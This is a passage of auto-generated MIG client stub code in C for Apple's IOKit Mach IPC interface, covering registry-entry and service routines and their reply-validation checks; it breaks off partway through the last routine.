#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_location_in_plane_t(__Reply__io_registry_entry_get_location_in_plane_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_location_in_plane_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2954) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->locationCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->locationCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->locationCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_location_in_plane */
mig_external kern_return_t io_registry_entry_get_location_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t location
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t locationOffset; /* MiG doesn't use it */
		mach_msg_type_number_t locationCnt;
		char location[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t locationOffset; /* MiG doesn't use it */
		mach_msg_type_number_t locationCnt;
		char location[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined */

	__DeclareSendRpc(2854, "io_registry_entry_get_location_in_plane")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2854;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2854, "io_registry_entry_get_location_in_plane")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2854, "io_registry_entry_get_location_in_plane")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_location_in_plane_t((__Reply__io_registry_entry_get_location_in_plane_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_location_in_plane_t__defined) */

	(void) mig_strncpy(location, Out0P->location, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_property_recursively_t(__Reply__io_registry_entry_get_property_recursively_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_property_recursively_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2955) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_property_recursively */
mig_external kern_return_t io_registry_entry_get_property_recursively
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined */

	__DeclareSendRpc(2855, "io_registry_entry_get_property_recursively")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->planeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 256) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->property_name, property_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->property_name, property_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->property_nameOffset = 0;

	msgh_size_delta = _WALIGN_(InP->property_nameCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->options = options;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2855;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2855, "io_registry_entry_get_property_recursively")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2855, "io_registry_entry_get_property_recursively")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_property_recursively_t((__Reply__io_registry_entry_get_property_recursively_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_property_recursively_t__defined) */

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_state_t__defined)
#define __MIG_check__Reply__io_service_get_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_state_t(__Reply__io_service_get_state_t *Out0P)
{

	typedef __Reply__io_service_get_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2956) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_state_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_state */
mig_external kern_return_t io_service_get_state
(
	mach_port_t service,
	uint64_t *state,
	uint32_t *busy_state,
	uint64_t *accumulated_busy_time
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t state;
		uint32_t busy_state;
		uint64_t accumulated_busy_time;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t state;
		uint32_t busy_state;
		uint64_t accumulated_busy_time;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_get_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_state_t__defined */

	__DeclareSendRpc(2856, "io_service_get_state")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2856;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2856, "io_service_get_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2856, "io_service_get_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_state_t__defined)
	check_result = __MIG_check__Reply__io_service_get_state_t((__Reply__io_service_get_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_state_t__defined) */

	*state = Out0P->state;

	*busy_state = Out0P->busy_state;

	*accumulated_busy_time = Out0P->accumulated_busy_time;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_services_ool_t__defined)
#define __MIG_check__Reply__io_service_get_matching_services_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_services_ool_t(__Reply__io_service_get_matching_services_ool_t *Out0P)
{

	typedef __Reply__io_service_get_matching_services_ool_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2957) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->existing.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->existing.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_services_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_services_ool */
mig_external kern_return_t io_service_get_matching_services_ool
(
	mach_port_t master_port,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	mach_port_t *existing
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_get_matching_services_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_services_ool_t__defined */

	__DeclareSendRpc(2857, "io_service_get_matching_services_ool")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t matchingTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->matching = matchingTemplate;
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
#else	/* UseStaticTemplates */
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
	InP->matching.deallocate =  FALSE;
	InP->matching.copy = MACH_MSG_PHYSICAL_COPY;
	InP->matching.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->matchingCnt = matchingCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2857;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2857, "io_service_get_matching_services_ool")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2857, "io_service_get_matching_services_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_services_ool_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_services_ool_t((__Reply__io_service_get_matching_services_ool_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_services_ool_t__defined) */

	*result = Out0P->result;

	*existing = Out0P->existing.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_match_property_table_ool_t__defined)
#define __MIG_check__Reply__io_service_match_property_table_ool_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_match_property_table_ool_t(__Reply__io_service_match_property_table_ool_t *Out0P)
{

	typedef __Reply__io_service_match_property_table_ool_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2958) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_match_property_table_ool_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_match_property_table_ool */
mig_external kern_return_t io_service_match_property_table_ool
(
	mach_port_t service,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	boolean_t *matches
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t matching;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		boolean_t matches;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		boolean_t matches;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_match_property_table_ool_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_match_property_table_ool_t__defined */

	__DeclareSendRpc(2858, "io_service_match_property_table_ool")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t matchingTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->matching = matchingTemplate;
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
#else	/* UseStaticTemplates */
	InP->matching.address = (void *)(matching);
	InP->matching.size = matchingCnt;
	InP->matching.deallocate =  FALSE;
	InP->matching.copy = MACH_MSG_PHYSICAL_COPY;
	InP->matching.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->matchingCnt = matchingCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2858;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2858, "io_service_match_property_table_ool")
